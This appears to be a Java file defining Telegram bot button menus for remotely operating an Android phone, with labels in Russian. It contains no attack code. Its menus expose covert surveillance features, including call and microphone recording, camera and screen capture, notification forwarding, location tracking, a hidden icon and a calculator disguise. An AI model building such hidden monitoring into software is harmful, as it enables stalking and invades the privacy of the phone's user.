package com.pulse.control;

import android.content.Context;

import org.json.JSONArray;
import org.json.JSONObject;

/** All bot keyboards in one place. */
public final class Kb {

    private Kb() {}

    public static JSONObject b(String t, String d) { return TgApi.btn(t, d); }
    public static JSONArray r(JSONObject... x) { return TgApi.row(x); }
    public static JSONObject kb(JSONArray... rows) { return TgApi.kb(rows); }

    // ---------------------------------------------------------------- main

    public static JSONObject main() {
        return kb(
                r(b("📱 Управление", "m:cat:ctl"), b("📷 Медиа", "m:cat:media")),
                r(b("📊 Инфо", "m:cat:info"), b("🤖 Авто", "m:cat:auto")),
                r(b("⚙️ Настройки", "m:cat:set"), b("🧭 Действия", "m:cat:act")),
                r(b("🎛 WebApp-панель", "m:webapp"), b("🥷 Скрытность", "m:iconpanel")),
                r(b("🔍 Поиск", "m:fsearch"), b("📸 Быстрый скрин", "m:screen")),
                r(b("💬 Алерт на экран", "m:alertask"), b("🖼 5 фото", "m:gallery5")),
                r(b("📚 Все функции", "m:allfunc"), b("🌿 Экономный", "m:ecotog")),
                r(b("📞 Запись звонков", "m:cr:list")),
                r(b("📸 Быстрый скрин", "m:screen"), b("🆘 Найти телефон", "m:find"))
        );
    }

    public static JSONObject catCtl() {
        return kb(
                r(b("📸 Скриншот", "m:screen"), b("🏠 Домой", "m:home")),
                r(b("🗂 Недавние", "m:recents"), b("🔔 Шторка", "m:notif")),
                r(b("🔒 Блокировка", "m:lock"), b("🎮 D-pad пульт", "m:dpad")),
                r(b("🎯 Тап по тексту", "m:tapx"), b("🔢 Сетка", "m:grid")),
                r(b("⌨️ Ввод текста", "m:text"), b("🔄 Скролл", "m:scroll")),
                r(b("🚀 Приложения", "m:apps"), b("🌐 Открыть ссылку", "m:url")),
                r(b("◀️ В меню", "m:menu"))
        );
    }

    public static JSONObject more() {
        return kb(
                r(b("🌐 Открыть ссылку", "m:url"), b("🔆 Яркость", "m:bright")),
                r(b("📁 Фото и файлы", "m:files"), b("🕶 Что открыто", "m:now")),
                r(b("⏰ Отложенные", "m:sched"), b("🌡 Алерты", "m:alerts")),
                r(b("👥 Админы", "m:admins"), b("🔐 PIN-код", "m:pin")),
                r(b("🖼 График батареи", "m:bat"), b("🧨 Паника", "m:panic")),
                r(b("◀️ В меню", "m:menu"))
        );
    }

    // ---------------------------------------------------------------- panels

    public static JSONObject volume() {
        return kb(
                r(b("➖ Тише", "m:vol_dn"), b("➕ Громче", "m:vol_up")),
                r(b("🔇 Без звука", "m:vol_mute"), b("🔔 На всю", "m:vol_full")),
                r(b("🔉 Звонок тише", "m:ring_dn"), b("🔊 Звонок громче", "m:ring_up")),
                r(b("◀️ В меню", "m:menu"))
        );
    }

    public static JSONObject vibrate() {
        return kb(
                r(b("1 сек", "m:vib:1"), b("3 сек", "m:vib:3"), b("5 сек", "m:vib:5")),
                r(b("10 сек", "m:vib:10"), b("🛑 Стоп", "m:vib:0")),
                r(b("◀️ В меню", "m:menu"))
        );
    }

    public static JSONObject torch() {
        return kb(
                r(b("💡 Включить", "m:torch:1"), b("🌑 Выключить", "m:torch:0")),
                r(b("🚨 SOS-мигание", "m:torch:sos")),
                r(b("◀️ В меню", "m:menu"))
        );
    }

    public static JSONObject find() {
        return kb(
                r(b("🔊 Сирена 3 сек", "m:find:3"), b("🔊 Сирена 10 сек", "m:find:10")),
                r(b("🛑 Стоп", "m:find:0"), b("📍 + Локация", "m:find:loc")),
                r(b("◀️ В меню", "m:menu"))
        );
    }

    public static JSONObject camera() {
        return kb(
                r(b("🤳 Фронтальная", "m:cam:front"), b("📷 Основная", "m:cam:back")),
                r(b("⏱ Тыл через 3 сек", "m:cam:back:3"), b("⏱ Фронт через 3 сек", "m:cam:front:3")),
                r(b("◀️ В меню", "m:menu"))
        );
    }

    public static JSONObject recScreen() {
        return kb(
                r(b("10 сек", "m:rec:10"), b("15 сек", "m:rec:15"), b("30 сек", "m:rec:30")),
                r(b("60 сек", "m:rec:60"), b("🔑 Разрешить запись", "m:rec:auth")),
                r(b("◀️ В меню", "m:menu"))
        );
    }

    public static JSONObject recMic() {
        return kb(
                r(b("10 сек", "m:mic:10"), b("30 сек", "m:mic:30"), b("60 сек", "m:mic:60")),
                r(b("◀️ В меню", "m:menu"))
        );
    }

    public static JSONObject live() {
        return kb(
                r(b("🖥 Начать трансляцию", "m:live:start"), b("⏹ Остановить", "m:live:stop")),
                r(b("🔑 Разрешить запись", "m:live:auth")),
                r(b("◀️ В меню", "m:menu"))
        );
    }

    public static JSONObject media() {
        return kb(
                r(b("⏮ Пред", "m:mprev"), b("⏯ Пауза", "m:mplay"), b("⏭ След", "m:mnext")),
                r(b("🎧 Что играет", "m:mnow"), b("🔉", "m:vol_dn"), b("🔊", "m:vol_up")),
                r(b("◀️ В меню", "m:menu"))
        );
    }

    public static JSONObject brightness() {
        return kb(
                r(b("🌑 10%", "m:br:10"), b("🌒 30%", "m:br:30")),
                r(b("🌓 50%", "m:br:50"), b("🌔 80%", "m:br:80")),
                r(b("☀️ 100%", "m:br:100"), b("🔄 Авто", "m:br:auto")),
                r(b("◀️ В меню", "m:menu"))
        );
    }

    public static JSONObject notifPanel(Context context) {
        boolean on = Config.notifOn(context);
        return kb(
                r(b(on ? "🔔 Пересылка: ВКЛ" : "🔕 Пересылка: ВЫКЛ", "m:ntog")),
                r(b("🚫 Игнор-лист", "m:nignore"), b("🧹 Очистить", "m:nclear")),
                r(b("◀️ В меню", "m:menu"))
        );
    }

    public static JSONObject schedule() {
        return kb(
                r(b("➕ Добавить", "m:sched:add"), b("🧹 Очистить всё", "m:sched:clear")),
                r(b("◀️ В меню", "m:menu"))
        );
    }

    public static JSONObject alerts(Context context) {
        return kb(
                r(b("🔋 Батарея <15%: " + onOff(Config.alertFlag(context, "al_low")), "m:al:al_low")),
                r(b("⚡ Зарядка: " + onOff(Config.alertFlag(context, "al_chg")), "m:al:al_chg")),
                r(b("📡 Пропала сеть: " + onOff(Config.alertFlag(context, "al_net")), "m:al:al_net")),
                r(b("🌡 Перегрев: " + onOff(Config.alertFlag(context, "al_temp")), "m:al:al_temp")),
                r(b("◀️ В меню", "m:menu"))
        );
    }

    private static String onOff(boolean on) { return on ? "✅" : "❌"; }

    public static JSONObject admins() {
        return kb(
                r(b("➕ Добавить", "m:adm:add"), b("🗑 Удалить", "m:adm:del")),
                r(b("◀️ В меню", "m:menu"))
        );
    }

    public static JSONObject pin(Context context) {
        Config cfg = Config.get(context);
        boolean has = cfg.pin != null && cfg.pin.length() >= 4;
        return kb(
                r(has ? b("🔓 Отключить PIN", "m:pin:off") : b("🔐 Задать PIN", "m:pin:set")),
                r(b("◀️ В меню", "m:menu"))
        );
    }

    public static JSONObject panic() {
        return kb(
                r(b("🧨 ДА, обнулить токен", "m:panic:yes")),
                r(b("◀️ Отмена", "m:menu"))
        );
    }

    public static JSONObject textPanel() {
        return kb(
                r(b("✍️ В активное поле", "m:text:send"), b("🔍 По названию поля", "m:text:field")),
                r(b("◀️ В меню", "m:menu"))
        );
    }

    public static JSONObject appsPage(java.util.List<Apps.Item> list, int page) {
        JSONArray rows = new JSONArray();
        int perPage = 8;
        int from = page * perPage;
        for (int i = from; i < Math.min(list.size(), from + perPage); i += 2) {
            JSONObject a = b(shortLabel(list.get(i).label), "app:" + i);
            if (i + 1 < Math.min(list.size(), from + perPage)) {
                rows.put(r(a, b(shortLabel(list.get(i + 1).label), "app:" + (i + 1))));
            } else {
                rows.put(r(a));
            }
        }
        JSONArray nav = new JSONArray();
        if (page > 0) nav.put(b("⬅️", "apg:" + (page - 1)));
        nav.put(b((page + 1) + "/" + Math.max(1, (list.size() + perPage - 1) / perPage), "m:noop"));
        if (from + perPage < list.size()) nav.put(b("➡️", "apg:" + (page + 1)));
        rows.put(nav);
        rows.put(r(b("◀️ В меню", "m:menu")));
        JSONObject out = new JSONObject();
        try { out.put("inline_keyboard", rows); } catch (Exception ignored) {}
        return out;
    }

    // ---------------------------------------------------------------- v2.1 panels

    public static JSONObject catMedia() {
        return kb(
                r(b("📷 Фото", "m:cam"), b("🎥 Видео с камеры", "m:camvid")),
                r(b("🎞 Серия фото", "m:burst"), b("🖥 Запись экрана", "m:rec")),
                r(b("🎙 Микрофон", "m:mic"), b("🔴 Запись без лимита", "m:rec2")),
                r(b("🎵 Медиа-пульт", "m:media"), b("🖼 Обои", "m:wall")),
                r(b("📤 Файлы", "m:files"), b("📥 Из TG", "m:fromtg")),
                r(b("◀️ В меню", "m:menu"))
        );
    }

    public static JSONObject catInfo() {
        return kb(
                r(b("📊 Статус", "m:stat"), b("🖥 CPU", "m:cpu")),
                r(b("🧠 RAM", "m:ram"), b("🌐 Сеть", "m:net")),
                r(b("🚀 Speedtest", "m:speed"), b("🔋 Батарея", "m:bat")),
                r(b("🌡 Алерты", "m:alerts"), b("📶 Радио", "m:radio")),
                r(b("📜 Уведомления", "m:nhist"), b("📱 Приложения", "m:applist")),
                r(b("◀️ В меню", "m:menu"))
        );
    }

    public static JSONObject catAuto() {
        return kb(
                r(b("🎬 Макросы", "m:macro"), b("⏰ Отложенные", "m:sched")),
                r(b("📰 Дайджест", "m:digest"), b("📶 Wi-Fi триггер", "m:trig")),
                r(b("🔁 Watchdog", "m:watchdog"), b("📍 Трекинг", "m:tracking")),
                r(b("🚨 SOS", "m:sos"), b("🖼 График батареи", "m:bat"))
        );
    }

    public static JSONObject callRecKb(android.content.Context c) {
        int m = CallRec.mode(c);
        boolean rec = CallRec.isRecording();
        return kb(
                r(b((m == 0 ? "● " : "○ ") + "Выключено", "m:cr:off"),
                        b((m == 1 ? "● " : "○ ") + "Все звонки", "m:cr:all")),
                r(b((m == 2 ? "● " : "○ ") + "Выбранные контакты", "m:cr:contacts")),
                r(b("➕ Добавить контакт", "m:cr:add"), b("📋 Записи", "m:cr:list")),
                r(b(rec ? "⏹ Остановить запись" : "🔴 Записать сейчас", rec ? "m:cr:stop" : "m:cr:start"),
                        b("📤 Отправить записи", "m:cr:send")),
                r(b("◀️ В меню", "m:menu"))
        );
    }

    public static JSONObject catSet() {
        return kb(
                r(b("👥 Админы", "m:admins"), b("🔐 PIN", "m:pin")),
                r(b("🚫 Игнор-лист", "m:nignore"), b("🧹 Очистить", "m:nclear")),
                r(b("🔕 Уведомления", "m:ntog"), b("🌍 Язык", "m:lang")),
                r(b("📈 Статистика", "m:stats"), b("📜 Журнал команд", "m:log")),
                r(b("🎭 Стелс-калькулятор", "m:stealth"), b("🧨 Паника", "m:panic")),
                r(b("◀️ В меню", "m:menu"))
        );
    }

    public static JSONObject catAct() {
        return kb(
                r(b("📞 Позвонить", "m:call"), b("💬 SMS", "m:sms")),
                r(b("📵 Сбросить звонок", "m:hangup"), b("📇 Контакты", "m:contacts")),
                r(b("⏰ Будильник", "m:alarm"), b("⏱ Таймер", "m:alarmx")),
                r(b("🌙 Без звука", "m:mute"), b("🔔 На всю", "m:vol_full")),
                r(b("🔆 Яркость", "m:bright"), b("💡 Не гаснет", "m:keepawake")),
                r(b("🎬 Макросы", "m:macro"), b("◀️ В меню", "m:menu"))
        );
    }

    public static JSONObject dpad() {
        return kb(
                r(b("◀️ Назад", "m:back")),
                r(b("", "m:noop"), b("▲", "m:dp:up"), b("", "m:noop")),
                r(b("◀", "m:dp:left"), b("● OK", "m:dp:ok"), b("▶", "m:dp:right")),
                r(b("", "m:noop"), b("▼", "m:dp:down"), b("", "m:noop")),
                r(b("🔄 Скролл ▲", "m:sc:up"), b("🔄 Скролл ▼", "m:sc:dn")),
                r(b("◀️ В меню", "m:menu"))
        );
    }

    public static JSONObject grid() {
        return kb(
                r(b("A1", "m:gr:A1"), b("B1", "m:gr:B1"), b("C1", "m:gr:C1")),
                r(b("A2", "m:gr:A2"), b("B2", "m:gr:B2"), b("C2", "m:gr:C2")),
                r(b("A3", "m:gr:A3"), b("B3", "m:gr:B3"), b("C3", "m:gr:C3")),
                r(b("◀️ В меню", "m:menu"))
        );
    }

    public static JSONObject macroPanel(org.json.JSONArray macros) {
        JSONArray rows = new JSONArray();
        for (int i = 0; i < macros.length() && i < 9; i++) {
            String name = macros.optJSONObject(i) == null ? "?" : macros.optJSONObject(i).optString("name");
            rows.put(r(b("▶️ " + name, "m:mac:" + i)));
        }
        rows.put(r(b("➕ Создать", "m:mac:add"), b("🗑 Стереть", "m:mac:del")));
        rows.put(r(b("◀️ В меню", "m:menu")));
        JSONObject out = new JSONObject();
        try { out.put("inline_keyboard", rows); } catch (Exception ignored) {}
        return out;
    }

    public static JSONObject alarmPanel() {
        return kb(
                r(b("⏰ Будильник 7:00", "m:alarm:7"), b("⏰ 8:00", "m:alarm:8")),
                r(b("⏱ 5 мин", "m:tmx:5"), b("⏱ 15 мин", "m:tmx:15"), b("⏱ 30 мин", "m:tmx:30")),
                r(b("✍️ Своё время", "m:alarm:ask")),
                r(b("◀️ В меню", "m:menu"))
        );
    }

    public static JSONObject appsExtra() {
        return kb(
                r(b("📞 Позвонить", "m:call"), b("💬 SMS", "m:sms")),
                r(b("📵 Сбросить звонок", "m:hangup"), b("📇 Контакты", "m:contacts")),
                r(b("⏰ Будильник", "m:alarm"), b("⏱ Таймер", "m:alarmx")),
                r(b("🔍 Найди в телефоне", "m:websearch")),
                r(b("◀️ В меню", "m:menu"))
        );
    }

    private static String shortLabel(String s) {
        if (s == null) return "?";
        return s.length() > 20 ? s.substring(0, 19) + "…" : s;
    }
}
